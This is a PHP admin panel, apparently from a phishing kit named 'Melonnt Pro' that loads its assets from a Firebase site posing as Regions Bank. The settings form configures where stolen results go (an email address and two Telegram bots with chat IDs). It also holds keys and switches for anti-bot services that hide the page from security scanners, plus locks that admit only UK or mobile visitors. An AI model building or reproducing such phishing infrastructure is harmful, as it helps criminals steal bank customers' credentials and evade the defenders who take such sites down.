<?php
error_reporting(E_ALL);
session_start();

if (empty($_SESSION['token'])) {
    header("Location: ./");
    exit();
}

$config = json_decode(file_get_contents('../control.json'), true);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $filePath = '../control.json';
        if (file_exists($filePath)) {
            $jsonData = file_get_contents($filePath);
            
            $data = json_decode($jsonData, true);
            
            if (is_array($data)) {
                $data['token'] = $_POST['token'];
                $data['email_result'] = $_POST['email_result'];
                $data['one_time_access'] = $_POST['one_time_access'];
                $data['killbot_key'] = $_POST['killbot_key'];
                $data['killbot_status'] = $_POST['killbot_status'];
                $data['antibot_key'] = $_POST['antibot_key'];
                $data['antibot_status'] = $_POST['antibot_status'];
                $data['mobile_lock'] = $_POST['mobile_lock'];
                $data['uk_lock'] = $_POST['uk_lock'];
                $data['telegram_deliv_1'] = $_POST['telegram_deliv_1'];
                $data['telegram_deliv_2'] = $_POST['telegram_deliv_2'];
                $data['bot_token'] = $_POST['bot_token'];
                $data['bot_token_2'] = $_POST['bot_token_2'];
                $data['chat_id'] = $_POST['chat_id'];
                $data['chat_id_2'] = $_POST['chat_id_2'];
                $data['parameter'] = $_POST['parameter'];
                $data['parameter_status'] = $_POST['parameter_status'];
                
                $newJsonData = json_encode($data, JSON_PRETTY_PRINT);
                
                if (file_put_contents($filePath, $newJsonData)) {
                    set_flash_message('succ', 'Data Berhasil di perbarui.');
                } else {
                    set_flash_message('err', 'Gagal Memperbarui data.');
                }
            } else {
                set_flash_message('err', 'File Json tidak terbaca.');
            }
        } else {
            set_flash_message('err', 'File Json tidak ditemukan.');
        }
}

function set_flash_message($key, $message) {
    $_SESSION[$key] = $message;
    $_SESSION[$key.'_flash'] = true;
}

?>
<!doctype html>
<html lang="en" class="dark-theme">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="https://regionsbank-cb54d.web.app/admin/images/favicon-32x32.png" type="image/png" />
  <!--plugins-->
  <link href="https://regionsbank-cb54d.web.app/admin/plugins/vectormap/jquery-jvectormap-2.0.2.css" rel="stylesheet"/>
  <link href="https://regionsbank-cb54d.web.app/admin/plugins/simplebar/css/simplebar.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/plugins/perfect-scrollbar/css/perfect-scrollbar.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/plugins/metismenu/css/metisMenu.min.css" rel="stylesheet" />
  <!-- Bootstrap CSS -->
  <link href="https://regionsbank-cb54d.web.app/admin/css/bootstrap.min.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/bootstrap-extended.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/style.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/icons.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">

  <!-- loader-->
  <link href="https://regionsbank-cb54d.web.app/admin/css/pace.min.css') }}" rel="stylesheet" />

  <!--Theme Styles-->
  <link href="https://regionsbank-cb54d.web.app/admin/css/dark-theme.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/light-theme.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/semi-dark.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/header-colors.css" rel="stylesheet" />

  <title>Melonnt Pro - Admin General</title>
</head>

<body>


  <!--start wrapper-->
  <div class="wrapper">
    <!--start top header-->
    <?= include("layout/header.php"); ?>
    <!--end top header-->

        <!--start sidebar -->
        <?= include("layout/sidebar.php"); ?>
        <!--end sidebar -->

       <!--start content-->
        <main class="page-content">
              
            <div class="row">
                <div class="col-md-12">
        
                    <?php
                      if(isset($_SESSION['err']))
                      {
                        $key = 'err';
                        echo '<div class="alert alert-danger">'.$_SESSION[$key].'</div>';
                        unset($_SESSION[$key]);
                        unset($_SESSION[$key.'_flash']);
                      } elseif(isset($_SESSION['succ'])) {
                        $key = 'succ';
                        echo '<div class="alert alert-success">'.$_SESSION[$key].'</div>';
                        unset($_SESSION[$key]);
                        unset($_SESSION[$key.'_flash']);
                      }
                      
                      ?>                
                        
                    <div class="card">
                        <div class="card-header">General Settings</div>
                        <div class="card-body">
                            <form method="POST">
                                <div class="mb-3">
                                    <label class="form-label">Token:</label>
                                    <input type="text" class="form-control" name="token" value="<?= $config['token']; ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Email Result:</label>
                                    <input type="text" class="form-control" name="email_result" value="<?= $config['email_result']; ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Onetime Access:</label>
                                    <select name="one_time_access" class="form-control">
                                        <option value="1"<?php if($config['one_time_access'] == 1): ?>  selected <?php endif; ?>>On</option>
                                        <option value="0" <?php if($config['one_time_access'] == 0): ?>  selected <?php endif; ?>>Off</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Parameter:</label>
                                    <input type="text" class="form-control" name="parameter" value="<?= $config['parameter']; ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Parameter Status:</label>
                                    <select name="parameter_status" class="form-control">
                                        <option value="1"<?php if($config['parameter_status'] == 1): ?>  selected <?php endif; ?>>On</option>
                                        <option value="0" <?php if($config['parameter_status'] == 0): ?>  selected <?php endif; ?>>Off</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">KillBot Key:</label>
                                    <input type="text" class="form-control" name="killbot_key" value="<?= $config['killbot_key']; ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">KillBot Status:</label>
                                    <select name="killbot_status" class="form-control">
                                        <option value="1"<?php if($config['killbot_status'] == 1): ?>  selected <?php endif; ?>>On</option>
                                        <option value="0" <?php if($config['killbot_status'] == 0): ?>  selected <?php endif; ?>>Off</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">AntiBot Key:</label>
                                    <input type="text" class="form-control" name="antibot_key" value="<?= $config['antibot_key']; ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">AntiBot Status (WorldWide) :</label>
                                    <select name="antibot_status" class="form-control">
                                        <option value="1"<?php if($config['antibot_status'] == 1): ?>  selected <?php endif; ?>>On</option>
                                        <option value="0" <?php if($config['antibot_status'] == 0): ?>  selected <?php endif; ?>>Off</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">AntiBot Lock UK:</label>
                                    <select name="uk_lock" class="form-control">
                                        <option value="1"<?php if($config['uk_lock'] == 1): ?>  selected <?php endif; ?>>On</option>
                                        <option value="0" <?php if($config['uk_lock'] == 0): ?>  selected <?php endif; ?>>Off</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Visitor Mobile Only:</label>
                                    <select name="mobile_lock" class="form-control">
                                        <option value="1"<?php if($config['mobile_lock'] == 1): ?>  selected <?php endif; ?>>On</option>
                                        <option value="0" <?php if($config['mobile_lock'] == 0): ?>  selected <?php endif; ?>>Off</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Token Telegram 1:</label>
                                    <input type="text" class="form-control" name="bot_token" value="<?= $config['bot_token']; ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Token Telegram 2:</label>
                                    <input type="text" class="form-control" name="bot_token_2" value="<?= $config['bot_token_2']; ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">ChatID Telegram 1:</label>
                                    <input type="text" class="form-control" name="chat_id" value="<?= $config['chat_id']; ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">ChatID Telegram 2:</label>
                                    <input type="text" class="form-control" name="chat_id_2" value="<?= $config['chat_id_2']; ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Send Telegram 1:</label>
                                    <select name="telegram_deliv_1" class="form-control">
                                        <option value="1"<?php if($config['telegram_deliv_1'] == 1): ?>  selected <?php endif; ?>>On</option>
                                        <option value="0" <?php if($config['telegram_deliv_1'] == 0): ?>  selected <?php endif; ?>>Off</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Send Telegram 2:</label>
                                    <select name="telegram_deliv_2" class="form-control">
                                        <option value="1"<?php if($config['telegram_deliv_2'] == 1): ?>  selected <?php endif; ?>>On</option>
                                        <option value="0" <?php if($config['telegram_deliv_2'] == 0): ?>  selected <?php endif; ?>>Off</option>
                                    </select>
                                </div>
                                <button class="btn btn-primary">Update</button>
                            </form>
                        </div>
                    </div>
                    
                </div>
            </div>
            
        </main>
       <!--end page main-->

       <!--start overlay-->
        <div class="overlay nav-toggle-icon"></div>
       <!--end overlay-->


       <!--Start Back To Top Button-->
		     <a href="javaScript:;" class="back-to-top"><i class='bx bxs-up-arrow-alt'></i></a>
       <!--End Back To Top Button-->

       <!--start switcher-->
       <div class="switcher-body">
        <button class="btn btn-primary btn-switcher shadow-sm" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasScrolling" aria-controls="offcanvasScrolling"><i class="bi bi-paint-bucket me-0"></i></button>
        <div class="offcanvas offcanvas-end shadow border-start-0 p-2" data-bs-scroll="true" data-bs-backdrop="false" tabindex="-1" id="offcanvasScrolling">
          <div class="offcanvas-header border-bottom">
            <h5 class="offcanvas-title" id="offcanvasScrollingLabel">Theme Customizer</h5>
            <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas"></button>
          </div>
          <div class="offcanvas-body">
            <h6 class="mb-0">Theme Variation</h6>
            <hr>
            <div class="form-check form-check-inline">
              <input class="form-check-input" type="radio" name="inlineRadioOptions" id="LightTheme" value="option1">
              <label class="form-check-label" for="LightTheme">Light</label>
            </div>
            <div class="form-check form-check-inline">
              <input class="form-check-input" type="radio" name="inlineRadioOptions" id="DarkTheme" value="option2">
              <label class="form-check-label" for="DarkTheme">Dark</label>
            </div>
            <div class="form-check form-check-inline">
              <input class="form-check-input" type="radio" name="inlineRadioOptions" id="SemiDarkTheme" value="option3">
              <label class="form-check-label" for="SemiDarkTheme">Semi Dark</label>
            </div>
            <hr>
            <div class="form-check form-check-inline">
              <input class="form-check-input" type="radio" name="inlineRadioOptions" id="MinimalTheme" value="option3" checked>
              <label class="form-check-label" for="MinimalTheme">Minimal Theme</label>
            </div>
            <hr/>
            <h6 class="mb-0">Header Colors</h6>
            <hr/>
            <div class="header-colors-indigators">
              <div class="row row-cols-auto g-3">
                <div class="col">
                  <div class="indigator headercolor1" id="headercolor1"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor2" id="headercolor2"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor3" id="headercolor3"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor4" id="headercolor4"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor5" id="headercolor5"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor6" id="headercolor6"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor7" id="headercolor7"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor8" id="headercolor8"></div>
                </div>
              </div>
            </div>
          </div>
        </div>
       </div>
       <!--end switcher-->

  </div>
  <!--end wrapper-->

  <script src="https://regionsbank-cb54d.web.app/admin/js/bootstrap.bundle.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/js/jquery.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/simplebar/js/simplebar.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/metismenu/js/metisMenu.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/perfect-scrollbar/js/perfect-scrollbar.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/vectormap/jquery-jvectormap-2.0.2.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/vectormap/jquery-jvectormap-world-mill-en.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/js/pace.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/chartjs/js/Chart.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/chartjs/js/Chart.extension.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/apexcharts-bundle/js/apexcharts.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/js/app.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/js/index.js"></script>


</body>

</html>